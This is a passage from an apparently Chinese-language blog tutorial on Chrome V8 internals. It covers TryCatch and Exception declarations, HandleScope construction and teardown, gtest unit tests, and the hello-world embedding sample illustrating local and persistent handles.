class="hljs-comment">/**</span><br><span class="hljs-comment">   * Set verbosity of the external exception handler.</span><br><span class="hljs-comment">   *</span><br><span class="hljs-comment">   * By default, exceptions that are caught by an external exception</span><br><span class="hljs-comment">   * handler are not reported.  Call SetVerbose with true on an</span><br><span class="hljs-comment">   * external exception handler to have exceptions caught by the</span><br><span class="hljs-comment">   * handler reported as if they were not caught.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SetVerbose</span><span class="hljs-params">(<span class="hljs-type">bool</span> value)</span></span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Returns true if verbosity is enabled.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsVerbose</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Set whether or not this TryCatch should capture a Message object</span><br><span class="hljs-comment">   * which holds source information about where the exception</span><br><span class="hljs-comment">   * occurred.  True by default.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SetCaptureMessage</span><span class="hljs-params">(<span class="hljs-type">bool</span> value)</span></span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * There are cases when the raw address of C++ TryCatch object cannot be</span><br><span class="hljs-comment">   * used for comparisons with addresses into the JS stack. The cases are:</span><br><span class="hljs-comment">   * 1) ARM, ARM64 and MIPS simulators which have separate JS stack.</span><br><span class="hljs-comment">   * 2) Address sanitizer allocates local C++ object in the heap when</span><br><span class="hljs-comment">   *    UseAfterReturn mode is enabled.</span><br><span class="hljs-comment">   * This method returns address that can be used for comparisons with</span><br><span class="hljs-comment">   * addresses into the JS stack. When neither simulator nor ASAN&#x27;s</span><br><span class="hljs-comment">   * UseAfterReturn is enabled, then the address returned will be the address</span><br><span class="hljs-comment">   * of the C++ try catch handler itself.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title">JSStackComparableAddress</span><span class="hljs-params">(TryCatch* handler)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-keyword">return</span> handler-&gt;js_stack_comparable_address_;<br>  &#125;<br><br>  <span class="hljs-built_in">TryCatch</span>(<span class="hljs-type">const</span> TryCatch&amp;) = <span class="hljs-keyword">delete</span>;<br>  <span class="hljs-type">void</span> <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> TryCatch&amp;) = <span class="hljs-keyword">delete</span>;<br><br> <span class="hljs-keyword">private</span>:<br>  <span class="hljs-comment">// Declaring operator new and delete as deleted is not spec compliant.</span><br>  <span class="hljs-comment">// Therefore declare them private instead to disable dynamic alloc</span><br>  <span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span></span>;<br>  <span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>[](<span class="hljs-type">size_t</span> size);<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-type">void</span>*, <span class="hljs-type">size_t</span>)</span></span>;<br>  <span class="hljs-type">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>[](<span class="hljs-type">void</span>*, <span class="hljs-type">size_t</span>);<br><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ResetInternal</span><span class="hljs-params">()</span></span>;<br><br>  internal::Isolate* isolate_;<br>  TryCatch* next_;<br>  <span class="hljs-type">void</span>* exception_;<br>  <span class="hljs-type">void</span>* message_obj_;<br>  <span class="hljs-type">void</span>* js_stack_comparable_address_;<br>  <span class="hljs-type">bool</span> is_verbose_ : <span class="hljs-number">1</span>;<br>  <span class="hljs-type">bool</span> can_continue_ : <span class="hljs-number">1</span>;<br>  <span class="hljs-type">bool</span> capture_message_ : <span class="hljs-number">1</span>;<br>  <span class="hljs-type">bool</span> rethrow_ : <span class="hljs-number">1</span>;<br>  <span class="hljs-type">bool</span> has_terminated_ : <span class="hljs-number">1</span>;<br><br>  <span class="hljs-keyword">friend</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">internal</span>::Isolate;<br>&#125;;<br></code></pre></td></tr></table></figure><p>主要的API如下：</p><ul><li><code>TryCatch()</code>构造函数传入的是<code>Isolate*</code>指针</li><li><code>bool HasCaught()</code>是否有错误被该<code>TryCatch</code>域捕获</li><li><code>Local&lt;Value&gt; Exception()</code>返回一个<code>Exception</code>对象，代表捕获的错误实体。</li><li><code>Local&lt;Value&gt; ReThrow();</code>重新将其捕获的错误通过<code>throw</code>抛出去</li></ul><p>异常生成的类叫<code>Exception</code>类：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">V8_EXPORT</span> Exception &#123;<br> <span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-type">static</span> Local&lt;Value&gt; <span class="hljs-title">RangeError</span><span class="hljs-params">(Local&lt;String&gt; message)</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">static</span> Local&lt;Value&gt; <span class="hljs-title">ReferenceError</span><span class="hljs-params">(Local&lt;String&gt; message)</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">static</span> Local&lt;Value&gt; <span class="hljs-title">SyntaxError</span><span class="hljs-params">(Local&lt;String&gt; message)</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">static</span> Local&lt;Value&gt; <span class="hljs-title">TypeError</span><span class="hljs-params">(Local&lt;String&gt; message)</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">static</span> Local&lt;Value&gt; <span class="hljs-title">WasmCompileError</span><span class="hljs-params">(Local&lt;String&gt; message)</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">static</span> Local&lt;Value&gt; <span class="hljs-title">WasmLinkError</span><span class="hljs-params">(Local&lt;String&gt; message)</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">static</span> Local&lt;Value&gt; <span class="hljs-title">WasmRuntimeError</span><span class="hljs-params">(Local&lt;String&gt; message)</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">static</span> Local&lt;Value&gt; <span class="hljs-title">Error</span><span class="hljs-params">(Local&lt;String&gt; message)</span></span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Creates an error message for the given exception.</span><br><span class="hljs-comment">   * Will try to reconstruct the original stack trace from the exception value,</span><br><span class="hljs-comment">   * or capture the current stack trace if not available.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function"><span class="hljs-type">static</span> Local&lt;Message&gt; <span class="hljs-title">CreateMessage</span><span class="hljs-params">(Isolate* isolate, Local&lt;Value&gt; exception)</span></span>;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * Returns the original stack trace that was captured at the creation time</span><br><span class="hljs-comment">   * of a given exception, or an empty handle if not available.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-function"><span class="hljs-type">static</span> Local&lt;StackTrace&gt; <span class="hljs-title">GetStackTrace</span><span class="hljs-params">(Local&lt;Value&gt; exception)</span></span>;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="小结">小结</h1><p>本节介绍了ChromeV8的一些基本数据类型和异常处理，其API均能在文档中找到。</p>]]></content>
    
    
    <categories>
      
      <category>Software Development</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Chromium</tag>
      
      <tag>v8</tag>
      
      <tag>javascript</tag>
      
      <tag>Data Types</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Chrome V8基础（二）</title>
    <link href="/2021/07/29/Basics-of-Chrome-V8-2/"/>
    <url>/2021/07/29/Basics-of-Chrome-V8-2/</url>
    
    <content type="html"><![CDATA[<h1 id="句柄作用域handlescope">句柄作用域（HandleScope）</h1><p>在代码中，句柄作用域以HandleScope或者EscapableHandleScope的形式存在于栈内存中，其实际上是一个维护一堆句柄的容器。当一个句柄作用域对象的析构函数被调用时，在这个作用域中创建的所有句柄都会被从栈中抹去。于是，通常情况下这些句柄所指的对象将会失去所有引用，然后被GC统一处理。</p><p>作用域是一个套一个的以栈的形式存在的，在栈顶的句柄作用域处于激活状态。每次创建新的被管理对象的时候，都会将对象交付给栈顶的作用域管理，当栈顶作用域生命周期结束时，这段时间创建的对象就会被回收。</p><h2 id="一般句柄作用域handle-scope">一般句柄作用域（Handle Scope）</h2><p>一个HandleScope只有三个成员：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">internal::Isolate* isolate_;<br>internal::Address* prev_next_;<br>internal::Address* prev_limit_;<br></code></pre></td></tr></table></figure><p>让我们看看创建一个作用域时会发生哪些事</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">v8::HandleScope handle_scope&#123;isolate_&#125;;<br></code></pre></td></tr></table></figure><p>构造函数只是单纯的跳到Initialize函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">HandleScope::<span class="hljs-built_in">HandleScope</span>(Isolate* isolate) &#123; <span class="hljs-built_in">Initialize</span>(isolate); &#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HandleScope::Initialize</span><span class="hljs-params">(Isolate* isolate)</span> </span>&#123;<br>  i::Isolate* internal_isolate = <span class="hljs-built_in">reinterpret_cast</span>&lt;i::Isolate*&gt;(isolate);<br>   <span class="hljs-comment">// ApiCheck(),skip</span><br>  i::HandleScopeData* current = internal_isolate-&gt;<span class="hljs-built_in">handle_scope_data</span>();<br>  isolate_ = internal_isolate;<br>  prev_next_ = current-&gt;next;<br>  prev_limit_ = current-&gt;limit;<br>  current-&gt;level++;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">HandleScopeData* <span class="hljs-title">handle_scope_data</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> &amp;handle_scope_data_; &#125;<br>HandleScopeData handle_scope_data_;<br></code></pre></td></tr></table></figure><p>HandleScopeData是一个定义在<code>src/handles/handles.h</code>中的结构体</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">HandleScopeData</span> <span class="hljs-keyword">final</span> &#123;<br>  Address* next;<br>  Address* limit;<br>  <span class="hljs-type">int</span> level;<br>  <span class="hljs-type">int</span> sealed_level;<br>  CanonicalHandleScope* canonical_scope;<br><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Initialize</span><span class="hljs-params">()</span> </span>&#123;<br>    next = limit = <span class="hljs-literal">nullptr</span>;<br>    sealed_level = level = <span class="hljs-number">0</span>;<br>    canonical_scope = <span class="hljs-literal">nullptr</span>;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>析构函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">HandleScope::~<span class="hljs-built_in">HandleScope</span>() &#123;<br>  i::HandleScope::<span class="hljs-built_in">CloseScope</span>(isolate_, prev_next_, prev_limit_);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HandleScope::CloseScope</span><span class="hljs-params">(Isolate* isolate, Address* prev_next,</span></span><br><span class="hljs-params"><span class="hljs-function">                             Address* prev_limit)</span> </span>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DEBUG</span><br>  <span class="hljs-type">int</span> before = FLAG_check_handle_count ? <span class="hljs-built_in">NumberOfHandles</span>(isolate) : <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-built_in">DCHECK_NOT_NULL</span>(isolate);<br>  HandleScopeData* current = isolate-&gt;<span class="hljs-built_in">handle_scope_data</span>();<br><br>  std::<span class="hljs-built_in">swap</span>(current-&gt;next, prev_next);<br>  current-&gt;level--;<br>  Address* limit = prev_next;<br>  <span class="hljs-keyword">if</span> (current-&gt;limit != prev_limit) &#123;<br>    current-&gt;limit = prev_limit;<br>    limit = prev_limit;<br>    <span class="hljs-built_in">DeleteExtensions</span>(isolate);<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> ENABLE_HANDLE_ZAPPING</span><br>  <span class="hljs-built_in">ZapRange</span>(current-&gt;next, limit);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-built_in">MSAN_ALLOCATED_UNINITIALIZED_MEMORY</span>(<br>      current-&gt;next,<br>      <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">size_t</span>&gt;(<span class="hljs-built_in">reinterpret_cast</span>&lt;Address&gt;(limit) -<br>                          <span class="hljs-built_in">reinterpret_cast</span>&lt;Address&gt;(current-&gt;next)));<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DEBUG</span><br>  <span class="hljs-type">int</span> after = FLAG_check_handle_count ? <span class="hljs-built_in">NumberOfHandles</span>(isolate) : <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">DCHECK_LT</span>(after - before, kCheckHandleThreshold);<br>  <span class="hljs-built_in">DCHECK_LT</span>(before, kCheckHandleThreshold);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>测试代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;gtest/gtest.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8_test_fixture.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/handles/handles-inl.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/objects/objects-inl.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/objects/contexts-inl.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;src/api/api-inl.h&quot;</span></span><br><br><span class="hljs-keyword">namespace</span> i = v8::internal;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HandleScopeTest</span> : <span class="hljs-keyword">public</span> V8TestFixture &#123; &#125;;<br><br><span class="hljs-built_in">TEST_F</span>(HandleScopeTest, HandleScopeData) &#123;<br>  i::Isolate* isolate = <span class="hljs-built_in">asInternal</span>(isolate_);<br>  <span class="hljs-function">i::HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate)</span></span>;<br>  i::HandleScopeData data&#123;&#125;;<br>  data.<span class="hljs-built_in">Initialize</span>();<br>  <span class="hljs-built_in">EXPECT_EQ</span>(data.next, <span class="hljs-literal">nullptr</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(data.limit, <span class="hljs-literal">nullptr</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(data.canonical_scope, <span class="hljs-literal">nullptr</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(data.level, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(data.sealed_level, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-built_in">TEST_F</span>(HandleScopeTest, Create) &#123;<br>  i::Isolate* i_isolate = <span class="hljs-built_in">asInternal</span>(isolate_);<br>  i_isolate-&gt;<span class="hljs-built_in">handle_scope_data</span>()-&gt;<span class="hljs-built_in">Initialize</span>();<br>  i::HandleScope handle_scope&#123;i_isolate&#125;;<br>  i::Object obj&#123;<span class="hljs-number">18</span>&#125;;<br>  <span class="hljs-function">i::Handle&lt;i::Object&gt; <span class="hljs-title">handle</span><span class="hljs-params">(obj, i_isolate)</span></span>;<br>  <span class="hljs-built_in">EXPECT_FALSE</span>(handle.<span class="hljs-built_in">is_null</span>());<br>  <span class="hljs-built_in">EXPECT_EQ</span>(*handle, obj);<br><br>  i::HandleScopeData* data = i_isolate-&gt;<span class="hljs-built_in">handle_scope_data</span>();<br>  <span class="hljs-built_in">EXPECT_EQ</span>(data-&gt;level, <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-built_in">TEST_F</span>(HandleScopeTest, HandleScopeImplementer) &#123;<br>  i::Isolate* i_isolate = <span class="hljs-built_in">asInternal</span>(isolate_);<br>  i::HandleScopeImplementer implementer&#123;i_isolate&#125;;<br>  <span class="hljs-comment">// Context is just a HeapObject so we can construct using the default not</span><br>  <span class="hljs-comment">// args constructor.</span><br>  i::Context context&#123;&#125;;<br><br>  implementer.<span class="hljs-built_in">SaveContext</span>(context);<br>  <span class="hljs-built_in">EXPECT_TRUE</span>(implementer.<span class="hljs-built_in">HasSavedContexts</span>());<br><br>  implementer.<span class="hljs-built_in">EnterContext</span>(context);<br>  <span class="hljs-built_in">EXPECT_EQ</span>(<span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;(implementer.<span class="hljs-built_in">EnteredContextCount</span>()), <span class="hljs-number">1</span>);<br>  implementer.<span class="hljs-built_in">LeaveContext</span>();<br>  <span class="hljs-built_in">EXPECT_EQ</span>(<span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">int</span>&gt;(implementer.<span class="hljs-built_in">EnteredContextCount</span>()), <span class="hljs-number">0</span>);<br><br>  i::DetachableVector&lt;i::Address*&gt;* blocks = implementer.<span class="hljs-built_in">blocks</span>();<br>  <span class="hljs-built_in">EXPECT_TRUE</span>(blocks-&gt;<span class="hljs-built_in">empty</span>());<br>  i::Address* block = implementer.<span class="hljs-built_in">GetSpareOrNewBlock</span>();<br>  blocks-&gt;<span class="hljs-built_in">push_back</span>(block);<br>  <span class="hljs-built_in">EXPECT_FALSE</span>(blocks-&gt;<span class="hljs-built_in">empty</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>让我们用Chrome V8的样例代码(<ahref="https://chromium.googlesource.com/v8/v8/+/branch-heads/6.8/samples/hello-world.cc">samples/hello-world.cc</a>)来分析下它的作用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;include/libplatform/libplatform.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;include/v8.h&quot;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> </span>&#123;<br>  <span class="hljs-comment">// Initialize V8.</span><br>  v8::V8::<span class="hljs-built_in">InitializeICUDefaultLocation</span>(argv[<span class="hljs-number">0</span>]);<br>  v8::V8::<span class="hljs-built_in">InitializeExternalStartupData</span>(argv[<span class="hljs-number">0</span>]);<br>  std::unique_ptr&lt;v8::Platform&gt; platform = v8::platform::<span class="hljs-built_in">NewDefaultPlatform</span>();<br>  v8::V8::<span class="hljs-built_in">InitializePlatform</span>(platform.<span class="hljs-built_in">get</span>());<br>  v8::V8::<span class="hljs-built_in">Initialize</span>();<br>  <span class="hljs-comment">// Create a new Isolate and make it the current one.</span><br>  v8::Isolate::CreateParams create_params;<br>  create_params.array_buffer_allocator =<br>      v8::ArrayBuffer::Allocator::<span class="hljs-built_in">NewDefaultAllocator</span>();<br>  v8::Isolate* isolate = v8::Isolate::<span class="hljs-built_in">New</span>(create_params);<br>  &#123;<br>    v8::<span class="hljs-function">Isolate::Scope <span class="hljs-title">isolate_scope</span><span class="hljs-params">(isolate)</span></span>;<br>    <span class="hljs-comment">// Create a stack-allocated handle scope.</span><br>    <span class="hljs-function">v8::HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate)</span></span>;<br>    <span class="hljs-comment">// Create a new context.</span><br>    v8::Local&lt;v8::Context&gt; context = v8::Context::<span class="hljs-built_in">New</span>(isolate);<br>    <span class="hljs-comment">// Enter the context for compiling and running the hello world script.</span><br>    v8::<span class="hljs-function">Context::Scope <span class="hljs-title">context_scope</span><span class="hljs-params">(context)</span></span>;<br>    <span class="hljs-comment">// Create a string containing the JavaScript source code.</span><br>    v8::Local&lt;v8::String&gt; source =<br>        v8::String::<span class="hljs-built_in">NewFromUtf8</span>(isolate, <span class="hljs-string">&quot;&#x27;Hello&#x27; + &#x27;, World!&#x27;&quot;</span>,<br>                                v8::NewStringType::kNormal)<br>            .<span class="hljs-built_in">ToLocalChecked</span>();<br>    <span class="hljs-comment">// Compile the source code.</span><br>    v8::Local&lt;v8::Script&gt; script =<br>        v8::Script::<span class="hljs-built_in">Compile</span>(context, source).<span class="hljs-built_in">ToLocalChecked</span>();<br>    <span class="hljs-comment">// Run the script to get the result.</span><br>    v8::Local&lt;v8::Value&gt; result = script-&gt;<span class="hljs-built_in">Run</span>(context).<span class="hljs-built_in">ToLocalChecked</span>();<br>    <span class="hljs-comment">// Convert the result to an UTF8 string and print it.</span><br>    v8::<span class="hljs-function">String::Utf8Value <span class="hljs-title">utf8</span><span class="hljs-params">(isolate, result)</span></span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, *utf8);<br>  &#125;<br>  <span class="hljs-comment">// Dispose the isolate and tear down V8.</span><br>  isolate-&gt;<span class="hljs-built_in">Dispose</span>();<br>  v8::V8::<span class="hljs-built_in">Dispose</span>();<br>  v8::V8::<span class="hljs-built_in">ShutdownPlatform</span>();<br>  <span class="hljs-keyword">delete</span> create_params.array_buffer_allocator;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在下图中，我们可以看到句柄堆栈和堆分配的对象。不妨在<code>v8::Local&lt;v8::Context&gt; context = v8::Context::New(isolate);</code>下面加上一句代码<code>Persistent&lt;Context&gt; persistent_context(isolate, context);</code>，便于理解持久句柄。</p><blockquote><p>图片来自<a href="https://v8.dev/docs/embed">Getting started withembedding V8 · V8</a></p></blockquote><figure><img lazyloadsrc="/img/loading.gif" data-src="https://v8.dev/_img/docs/embed/local-persist-handles-review.png"alt="句柄与句柄作用域" /><figcaption aria-hidden="true">句柄与句柄作用域</figcaption></figure><ol type="1"><li><code>HandleScope handle_scope(isolate);</code>创建一个句柄作用域，根据C++的特性，在它所处的作用域结束时，其生命周期也就结束了，这时候程序会自动调用它的析构函数。</li><li><code>Local&lt;Context&gt; context = Context::New(isolate);</code>创建一个Context对象，并得到它的本地句柄。该句柄存在于<code>handle_scope</code>的句柄栈中，被这个HandleScope对象管理，同时它的真实对象存在于堆内存中，被GC盯着。</li><li><code>Persistent&lt;Context&gt; persistent_context(isolate, context);</code>基于context我们创建一个新的持久句柄和<code>Context</code>对象，它不再受句柄作用域掌控，直接被GC管理。</li><li><code>Context::Scope context_scope(context);</code>进入context以编译和执行hello world脚本。</li><li><code>Local&lt;String&gt; source = String::NewFromUtf8(...).ToLocalChecked();</code>将一段JavaScript代码赋值给一个V8字符串，并得到句柄。</li><li><code>Local&lt;Script&gt; script = Script::Compile(context, source).ToLocalChecked();</code>编译代码。</li><li><code>Local&lt;Value&gt; result = script-&gt;Run(context).ToLocalChecked();</code>执行代码。</li></ol><p>最后，当HandleScope的析构函数被调用时，这些在这个句柄作用域中被创建的句柄和对象如果没有其他地方有引用的话，就会在下一次垃圾回收的时候被处理掉。不过我们创建的那个持久句柄并不会在析构时被动手，我们只能显式的调用Reset清除它。</p><h2 id="可逃句柄作用域escapable-handle-scope">可逃句柄作用域（EscapableHandle Scope）</h2><p>根据上文所说，如果一个函数有一个 HandleScope并且想要返回一个本地句柄，它在函数返回后将不可用。这就是<code>EscapableHandleScope</code>的作用了，它有一个<code>Escape</code>函数，可以给一个句柄以豁免权，将其复制到一个封闭的作用域中并删除其他的本地句柄，然后返回这个新复制的可以安全返回的句柄。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 